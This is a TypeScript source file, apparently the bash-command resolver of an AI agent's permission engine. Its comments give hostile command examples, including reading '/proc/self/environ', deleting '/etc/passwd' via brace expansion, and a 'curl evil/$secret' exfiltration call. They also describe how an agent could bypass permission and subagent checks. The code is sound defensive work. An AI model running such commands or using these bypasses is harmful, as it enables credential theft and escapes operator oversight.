  realpathMissingWarned = false;
};

// Resolve a lexical absolute path to its canonical form for
// classification, with three sequential fallbacks. Used by BOTH
// `classifyArgWithCanonical` (protected-path tier check) and
// `detectCwdScopeEscape` (cwd-scope check) — both helpers need
// identical canonicalization semantics, including the dangling-
// symlink case the parent-realpath fallback alone gets wrong.
//
// Strategy:
//   1. `realpath(lexicalAbs)` — fast path; succeeds when every
//      component exists. Throws ENOENT for write-creates-new-file
//      or for a dangling symlink leaf.
//   2. `readlink(lexicalAbs)` — when (1) throws, check if the leaf
//      is itself a symlink. `readlink` returns the STORED target
//      (no recursive resolution) even when that target was
//      removed. Absolute target = use as-is. Relative target =
//      resolve against `dirname(lexicalAbs)`. This is the case
//      a dangling outlink → /tmp/x exhibits: realpath fails but
//      the symlink itself still exists and points OUTSIDE cwd.
//      Pre-fix this case fell through to (3), which collapses
//      to lexical and misses the escape.
//   3. `realpath(dirname) + basename` — when neither (1) nor (2)
//      worked, the leaf is a fresh file under an existing parent
//      (write-creates-new-file). Catches parent-is-symlink shapes
//      (cwd_alias/leaf where cwd_alias → /etc, write `> leaf`
//      creates /etc/leaf).
//   4. Give up — return null and the caller falls back to the
//      lexical classification.
const canonicalizeForClassification = (lexicalAbs: string, ctx: ResolverContext): string | null => {
  if (ctx.realpath === undefined) {
    warnRealpathMissingOnce(ctx);
    return null;
  }
  try {
    return ctx.realpath(lexicalAbs);
  } catch {
    // (2) Dangling-symlink probe: even if the leaf's TARGET is
    // gone, the symlink itself still exists and the kernel will
    // open the stored target at exec time. `readlink` reads the
    // stored target without recursive resolution. ALWAYS normalize
    // before returning — both the absolute and the relative branch.
    //
    // For absolute targets: an `/work/proj/../tmp/x` literal looks
    // like it's inside `/work/proj` by string-prefix tests
    // downstream but the kernel resolves it to `/work/tmp/x` —
    // `resolvePath(target)` collapses `..`/`.` to give the kernel
    // view.
    //
    // For relative targets: resolve against the CANONICAL parent
    // (`realpath(dirname)`), NOT the lexical dirname. If a parent
    // segment is itself a symlink (`/work/proj/alias → /tmp/ext`,
    // then `/work/proj/alias/out → ../secret`), the relative walk
    // happens in `/tmp/ext`, not `/work/proj/alias`. Using lexical
    // dirname here would compute `/work/proj/secret` while the
    // kernel ends up at `/tmp/secret` — escape masked. When the
    // parent's own realpath fails (deeply dangling chain), fall
    // back to the lexical dirname; that case is the worst-case
    // residual gap, documented below in stage (3)'s caveat.
    if (ctx.readlink !== undefined) {
      try {
        const target = ctx.readlink(lexicalAbs);
        if (isAbsolute(target)) {
          return resolvePath(target);
        }
        let canonicalParent: string;
        try {
          canonicalParent = ctx.realpath(dirname(lexicalAbs));
        } catch {
          canonicalParent = dirname(lexicalAbs);
        }
        return resolvePath(canonicalParent, target);
      } catch {
        // Not a symlink, or readlink failed for other reasons —
        // fall through to (3).
      }
    }
    // (3) Parent-realpath + basename for fresh-leaf-under-existing-
    // parent (where the parent may itself be a symlink). basename
    // strips any path separators, so the rejoin can't smuggle `..`
    // — but normalize defensively so a future change to either
    // input shape (parent realpath returning a path that needs
    // collapsing, basename behavior change in a runtime upgrade)
    // doesn't reopen the same bypass.
    try {
      const parentReal = ctx.realpath(dirname(lexicalAbs));
      return resolvePath(joinPath(parentReal, basename(lexicalAbs)));
    } catch {
      return null;
    }
  }
};

const classifyArgWithCanonical = (
  lexicalAbs: string,
  op: 'read' | 'write',
  ctx: ResolverContext,
): 'deny' | 'escalate' | null => {
  const lexicalTier = classifyProtectedPath({
    absPath: lexicalAbs,
    op,
    home: ctx.home,
    cwd: ctx.cwd,
  });
  // Deny on lexical short-circuits — canonical can only stay-or-deny,
  // it cannot relax. Skip the realpath roundtrip in the hot path.
  if (lexicalTier === 'deny') return lexicalTier;
  if (ctx.realpath === undefined) {
    warnRealpathMissingOnce(ctx);
    return lexicalTier;
  }

  const canonical = canonicalizeForClassification(lexicalAbs, ctx);
  if (canonical === null || canonical === lexicalAbs) return lexicalTier;

  const canonicalTier = classifyProtectedPath({
    absPath: canonical,
    op,
    home: ctx.home,
    cwd: ctx.cwd,
  });
  return tierRank(canonicalTier) > tierRank(lexicalTier) ? canonicalTier : lexicalTier;
};

// Slice 178 (hardening A1, audit follow-up to slice 176). The
// canonical-aware classifier above catches symlinks escaping into
// well-known protected zones (/etc, /proc, ~/.ssh, ...) but NOT
// symlinks escaping cwd into arbitrary external locations the
// operator's policy may scope by `<cwd>/**` glob. Example:
//   cwd = /work/proj
//   /work/proj/data/x → /tmp/exfil-target
//   policy: allow read-fs:/work/proj/**
// classifyProtectedPath returns null for both ends (neither in a
// classifier zone); the engine matches the lexical capability against
// the glob and authorizes. The kernel then follows the symlink and
// the read lands on /tmp/exfil-target — outside the operator's
// intended scope but never visible to the policy match.
//
// Returns true when lexical stays inside cwd but canonical does not.
// Callers degrade confidence to 'low' (engine forces confirm). Hard-
// refusal would break legitimate use (yarn workspaces sometimes have
// symlinks pointing outside the project root); low-confidence funnels
// the call through the operator's modal, which is the right trade.
const detectCwdScopeEscape = (lexicalAbs: string, ctx: ResolverContext): boolean => {
  if (ctx.realpath === undefined) {
    warnRealpathMissingOnce(ctx);
    return false;
  }
  const canonical = canonicalizeForClassification(lexicalAbs, ctx);
  if (canonical === null || canonical === lexicalAbs) return false;
  const cwdPrefix = ctx.cwd.endsWith('/') ? ctx.cwd : `${ctx.cwd}/`;
  const lexicalInside = lexicalAbs === ctx.cwd || lexicalAbs.startsWith(cwdPrefix);
  const canonicalInside = canonical === ctx.cwd || canonical.startsWith(cwdPrefix);
  return lexicalInside && !canonicalInside;
};

// Classify a set of redirect targets, independent of the command they
// attach to (or no command at all). A redirect to a deny-tier path
// (`/proc`, `/dev/sda`, ...) is refused for ANY command — known,
// registry-miss, or none — and the read-fs/write-fs cap is emitted so
// the engine's §11 / bypass-mode protected-path floors (which scan
// resolved capabilities) can see it. Returns `{refuse}` or the caps plus
// an `escalated` flag (escalate-tier target / cwd-scope escape → force
// confirm). Hoisted out of analyzeCommand so the registry-miss and
// no-command paths classify redirects too.
const classifyRedirects = (
  redirects: readonly RedirectShape[],
  ctx: ResolverContext,
): { refuse: string } | { caps: Capability[]; escalated: boolean } => {
  const caps: Capability[] = [];
  let escalated = false;
  for (const r of redirects) {
    if (r.kind === 'out' || r.kind === 'append' || r.kind === 'both' || r.kind === 'force-out') {
      const tgtAbs = resolvePath(ctx.cwd, expandTilde(r.target, ctx.home));
      const tier = classifyArgWithCanonical(tgtAbs, 'write', ctx);
      if (tier === 'deny') {
        return { refuse: `bash: redirect target '${r.target}' is in protected zone (deny tier)` };
      }
      if (tier === 'escalate') escalated = true;
      if (detectCwdScopeEscape(tgtAbs, ctx)) escalated = true;
      caps.push(writeFs(tgtAbs));
    }
    // Input redirects `<` ALSO pass through the classifier (op='read' →
    // only SYSTEM_DENY_ROOTS catch; escalate doesn't apply to reads):
    // `cat < /proc/self/environ` reads attacker-targeted credentials.
    if (r.kind === 'in') {
      const tgtAbs = resolvePath(ctx.cwd, expandTilde(r.target, ctx.home));
      const tier = classifyArgWithCanonical(tgtAbs, 'read', ctx);
      if (tier === 'deny') {
        return {
          refuse: `bash: input redirect source '${r.target}' is in protected zone (deny tier)`,
        };
      }
      if (detectCwdScopeEscape(tgtAbs, ctx)) escalated = true;
      caps.push(readFs(tgtAbs));
    }
  }
  return { caps, escalated };
};

const analyzeCommand = (
  shape: CommandShape,
  ctx: ResolverContext,
):
  | { refuse: string }
  | { caps: Capability[]; confidence: 'high' | 'medium' | 'low'; conservative?: string } => {
  // Hard-refuse check on BOTH the literal name and a quote/escape-
  // stripped "bare" form. literalText now strips raw_string quotes, but
  // backslash escapes (`\eval`) and mixed forms can still mask a hard
  // command; bash removes those at runtime. Stripping `'"\` before the
  // check matches bash's effective command name — it can only over-match
  // (safe-side, refuses an exotic literal), never under-match a laundered
  // eval/dd/sudo. Without this, the soft→conservative split would let
  // `'eval'`/`ev''al`/`\eval` reach an operator-approvable confirm.
  const bareName = stripShellQuoting(shape.name);
  if (isHardRefuseCommand(shape.name) || isHardRefuseCommand(bareName)) {
    return {
      refuse: `bash: command '${shape.name}' has no safe capability resolution`,
    };
  }

  // Per-arg protected-path check. Closes the slice-1 bash-side gap.
  // Skipped for pure-output commands (echo/printf) whose args are
  // literal output text, not filesystem targets. Redirects on those
  // commands are still checked in the redirect loop below.
  // §11 protected-path check over bash positional args. Slice 100
  // (R2 #206): pre-slice this loop skipped EVERY token starting
  // with `-`, including the `--flag=<value>` shape that carries
  // a real path in the value half. `--config=/etc/agent/policy.toml`
  // looked like a flag to the loop and slipped past the classifier
  // — an LLM tricking a tool into accepting a protected path as
  // a flag value would bypass §11 entirely.
  //
  // Fix: detect `--flag=<value>` and `-f=<value>` shapes, extract
  // the value, classify it. Pure flags (`-r`, `--help`) without
  // an `=` still skip — those carry no path content. Flag-value
  // pairs separated by space (`-o /etc/foo`) are out of scope
  // here because the loop sees them as two consecutive tokens;
  // the per-command resolvers that care about them (cmdCurlWget,
  // slice 98 R2 #200) already consume both and emit explicit
  // capabilities that the engine's downstream §11 walk catches.
  const extractFlagValue = (arg: string): string | null => {
    if (!arg.startsWith('-')) return arg;
    const eq = arg.indexOf('=');
    if (eq === -1) return null;
    const value = arg.slice(eq + 1);
    return value.length > 0 ? value : null;
  };
  let escalated = false;
  if (!isPureOutputCommand(shape.name)) {
    const targets = protectedTargets(ctx.home, ctx.cwd);
    for (const arg of shape.args) {
      if (arg.length === 0) continue;
      const candidate = extractFlagValue(arg);
      if (candidate === null) continue;
      const op: 'read' | 'write' = isReadOnlyCommand(shape.name) ? 'read' : 'write';

      // Slice 125 (R2 P0-3): shell brace + glob expansion bypass.
      // `rm /e{tc}/passwd` parses as a single `word` in the tree-
      // sitter AST and resolves to literal `/e{tc}/passwd`; neither
      // matches any protected zone via classifyProtectedPath. But
      // the SHELL expands `{tc}` deterministically to `etc` before
      // exec, so the actual call is `rm /etc/passwd`. Similarly
      // `rm /e*/passwd` could match `/etc/passwd` via glob
      // expansion at runtime.
      //
      // Defense:
      //   1. Expand brace patterns deterministically and check
      //      every expansion against the classifier. Brace
      //      expansion is FS-INDEPENDENT in bash, so we can do
      //      this safely.
      //   2. For glob metachars (`*`, `?`, `[`) we can't pre-
      //      expand without FS access. Refuse if the literal
      //      prefix could lead into a protected zone (i.e., any
      //      protected target starts with the literal prefix).
      const expansions = expandBraces(candidate);
      for (const exp of expansions) {
        if (containsGlobMetachar(exp)) {
          // Slice 127 (R3): expand tilde BEFORE absolutizing so
          // `~/.s*` resolves to `/home/op/.s*` (matching protected
          // tilde-dirs) instead of `/work/proj/~/.s*` which never
          // overlaps any classifier target.
          const literalPrefix = globLiteralPrefix(exp);
          const absLiteralPrefix = resolvePath(ctx.cwd, expandTilde(literalPrefix, ctx.home));
          if (couldGlobReachProtected(absLiteralPrefix, targets)) {
            return {
              refuse: `bash: ${shape.name} target '${exp}' uses a shell glob (*/?/[) whose literal prefix could expand into a protected zone — refusing static analysis`,
            };
          }
          // Glob into safe paths: still escalate confidence so
          // the operator's modal sees the metachar.
          escalated = true;
          continue;
        }
        // Slice 127 (R3): expand tilde so `~/.ssh/id_rsa` resolves
        // to the home-relative absolute that classifyProtectedPath
        // recognizes, rather than a literal `~/...` under cwd.
        // resolveArg already does this for the per-resolver
        // attribution path; the analyzeCommand classifier loop
        // wasn't doing it.
        const abs = resolvePath(ctx.cwd, expandTilde(exp, ctx.home));
        // Slice 176: canonical-aware classification. ctx.realpath
        // is wired by the engine; tests that omit it stay on the
        // lexical-only fast path (current behavior preserved).
        const tier = classifyArgWithCanonical(abs, op, ctx);
        if (tier === 'deny') {
          return {
            refuse: `bash: ${shape.name} target '${exp}' is in protected zone (deny tier, see PERMISSION_ENGINE.md §11)`,
          };
        }
        if (tier === 'escalate') escalated = true;
        // Slice 178: cwd-scope symlink escape. Lexical inside cwd
        // but canonical outside means a glob policy like
        // `<cwd>/**` would authorize lexically while the kernel
        // follows the symlink to whatever target the operator
        // never scoped. Degrade confidence to force confirm.
        if (detectCwdScopeEscape(abs, ctx)) escalated = true;
      }
    }
  }

  // Classify redirect targets BEFORE the registry split. Pre-fix the
  // redirect loop lived AFTER the registry-miss early-return, so a
  // redirect to a deny-tier path on an unmodeled command
  // (`some_tool > /proc/sysrq-trigger`, `sed -n p < /proc/1/environ`)
  // skipped the deny check and emitted no fs cap — and under
  // `mode: bypass` the engine's §11 floor (which only scans resolved
  // capabilities) had nothing to deny. Hoisting it refuses the deny-tier
  // target for known AND registry-miss commands, and rides the read/write
  // cap onto the conservative result so the floor stays honest.
  const redir = classifyRedirects(shape.redirects, ctx);
  if ('refuse' in redir) return { refuse: redir.refuse };

  const handler = COMMAND_TABLE.get(shape.name);
  if (handler === undefined) {
    // Registry miss → Conservative, not Refuse (PERMISSION_ENGINE.md
    // §5.2 step 3c). Not in HARD_REFUSE_COMMANDS, so not categorically
    // dangerous — just unmodeled. Conservative forces a confirm; the
    // redirect caps (above) ride along so the engine floors stay honest.
    return {
      caps: redir.caps,
      confidence: 'low',
      conservative: `unknown_command: ${shape.name}`,
    };
  }
  const positional = stripFlags(shape.args);
  const result = handler(positional, shape.args, ctx);
  if ('refuse' in result) return { refuse: result.refuse };
  let finalConf: 'high' | 'medium' | 'low' = result.confidence;
  if (escalated || redir.escalated) finalConf = 'low';

  return {
    caps: [...result.capabilities, ...redir.caps],
    confidence: finalConf,
  };
};

// ─── Resolver entry ────────────────────────────────────────

const bashResolver: Resolver = (args, ctx): ResolverResult => {
  if (!isNonEmptyString(args.command)) {
    // Engine-internal reject (missing arg) — bash pipeline produces
    // its own deny with `source.layer='default'` and no section.
    // Empty Ok keeps that attribution shape intact.
    return { kind: 'ok', capabilities: [], confidence: 'high' };
  }
  let parsed: ReturnType<typeof parseBash>;
  try {
    parsed = parseBash(args.command);
  } catch (e) {
    return {
      kind: 'refuse',
      reason: `bash: parser unavailable (${(e as Error).message})`,
    };
  }
  if (parsed === null) {
    return { kind: 'refuse', reason: 'bash: parser produced no tree' };
  }
  const root = parsed.root;

  // Whitelist walk first. Any red-flag / out-of-whitelist node
  // refuses the entire script — composition rules in bash mean any
  // single unsafe element can poison the rest.
  const walk = walkAst(root);
  if (walk.refuse !== undefined) {
    // HARD refuse: a HARD red-flag node (command/process substitution,
    // function def, `VAR=val` prefix, arithmetic, heredoc/herestring,
    // ansi-c, subscript), a dynamic command NAME, a non-literal redirect
    // target, a parse error, or an unmodeled TOP-LEVEL shape — pre-policy
    // deny the operator can't unlock. Soft-unmodeled shapes do NOT reach
    // here: walkAst RECURSES through them and returns {commands,
    // soft:true}, so every command in a loop/conditional body is still
    // run through analyzeCommand below.
    return { kind: 'refuse', reason: walk.refuse };
  }
  const commands = walk.commands ?? [];

  // Pipe-to-shell detection (whole tree, incl. inside a soft loop body).
  // A pipeline whose last stage is sh/bash/python/... reads stdin as an
  // arbitrary script. Refuse.
  const pipeShell = detectPipeToShell(root);
  if (pipeShell !== null) {
    return {
      kind: 'refuse',
      reason: `bash: pipe-to-shell pattern detected (pipeline ends in '${pipeShell}')`,
    };
  }

  // Orphan redirects: a redirect with NO command to attach to
  // (`[[ -e x ]] > f`, bare `> f`). analyzeCommand never sees these
  // (no CommandShape carries them), so classify them here — a deny-tier
  // target refuses regardless of whether any command was resolved, and
  // its cap rides onto the result so the engine floors stay honest.
  const orphanRedir = classifyRedirects(walk.orphanRedirects ?? [], ctx);
  if ('refuse' in orphanRedir) {
    return { kind: 'refuse', reason: orphanRedir.refuse };
  }

  if (commands.length === 0) {
    // A soft shape with no resolvable command (`[[ -e x ]]`, `( )`) is
    // unmodeled-but-benign → confirm. Not soft + no command → nothing
    // recognized → refuse (existing posture).
    if (walk.soft === true) {
      return {
        kind: 'conservative',
        capabilities: [exec('shell'), ...orphanRedir.caps],
        reason: `bash: ${walk.softReason ?? 'unmodeled shape'} (no resolvable command) → confirm`,
      };
    }
    return { kind: 'refuse', reason: 'bash: no commands recognized' };
  }

  // analyzeCommand applies the FULL per-command defense — HARD_REFUSE
  // commands (incl. quote/escape-laundered names), rm system-roots,
  // redirect-to-protected-path, protected-path globs, chmod
  // permission-mutate, git -c RCE, etc. — to EVERY command, INCLUDING
  // those collected from inside a soft control-flow body. This is the
  // load-bearing safeguard: it is why `for x in *; do rm -rf /; done`,
  // `for i in 1; do echo x > /proc/...; done`, `for x in *; do cat
  // /etc/pass*; done`, and `'eval'`/`$()` inside a loop all stay denied
  // even though the wrapping shape is soft.
  const allCaps: Capability[] = [exec('shell'), ...orphanRedir.caps];
  let aggregateConf: 'high' | 'medium' | 'low' = 'high';
  let conservativeReason: string | null = null;
  for (const shape of commands) {
    const result = analyzeCommand(shape, ctx);
    if ('refuse' in result) {
      return { kind: 'refuse', reason: result.refuse };
    }
    allCaps.push(...result.caps);
    if (result.conservative !== undefined) conservativeReason ??= result.conservative;
    if (result.confidence === 'low') aggregateConf = 'low';
    else if (result.confidence === 'medium' && aggregateConf === 'high') aggregateConf = 'medium';
  }

  // A soft-unmodeled wrapper (control flow / value expansion) OR a
  // registry-miss command → Conservative (forces confirm), per
  // PERMISSION_ENGINE.md §5.2. Caps are the honest aggregate of the
  // resolved inner commands, so the engine's downstream §11 floors (and
  // the bypass-mode protected-path check) still see real read/write/
  // delete capabilities — not a blind `[exec('shell')]`.
  if (walk.soft === true || conservativeReason !== null) {
    const reason =
      conservativeReason !== null
        ? `bash: ${conservativeReason}`
        : `bash: ${walk.softReason ?? 'unmodeled shape (control flow / value expansion)'} → confirm`;
    return { kind: 'conservative', capabilities: allCaps, reason };
  }
  return { kind: 'ok', capabilities: allCaps, confidence: aggregateConf };
};

registerResolver('bash', bashResolver);

// Slice 128 (R4 P0-Bypass-1): register the bash AST resolver for the
// background-bash family too. Pre-slice `bash_background`,
// `bash_output`, `bash_kill` had no resolver entry; the engine's
// `resolveCapabilities(toolName)` fell to the conservative
// (no-resolver) path returning `capabilities: []`. The §10.1
// subagent envelope check at `engine.ts:1338` is gated on
// `resolvedCapabilities.length > 0`, so a subagent with narrowed
// envelope (e.g., `['read-fs:src/**']`) could call
// `bash_background('curl evil/$secret')` and bypass the envelope
// check entirely.
//
// The same `args.command` shape feeds these tools; the bash AST
// resolver works for them unchanged. bash_output and bash_kill
// don't carry a `command` arg (they reference a background job
// id) — the resolver returns conservative `{capabilities: []}`
// for those shapes but at least gets called, so the envelope
// gate can run. bash_kill MIGHT still slip through if the
// envelope gate skips empty-cap calls; the proper architectural
// fix is to make the gate fire for any side-effect-declaring tool
// regardless of resolver output, but registering the resolver
// closes the immediate exposure.
registerResolver('bash_background', bashResolver);
registerResolver('bash_output', bashResolver);
registerResolver('bash_kill', bashResolver);
